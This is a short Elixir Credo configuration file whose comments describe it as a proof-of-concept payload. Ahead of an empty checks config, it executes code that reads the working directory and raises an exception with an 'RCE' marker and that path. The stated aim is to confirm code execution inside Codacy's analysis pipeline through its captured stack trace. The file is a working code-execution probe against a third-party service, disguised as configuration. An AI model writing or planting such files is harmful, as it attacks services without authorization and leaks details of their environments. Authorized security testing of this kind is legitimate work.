# PoC payload v4 - pure raise of a runtime sentinel, no file work, no halt. Tests whether credo's
# unhandled exception message lands in Codacy's captured step stackTrace.
cwd = File.cwd!()
raise "CODEX_RCE_CREDO_PROOF_#{cwd}_marker_seen_at_eval_NO_FILE_WORK"

%{configs: [%{name: "default", checks: []}]}
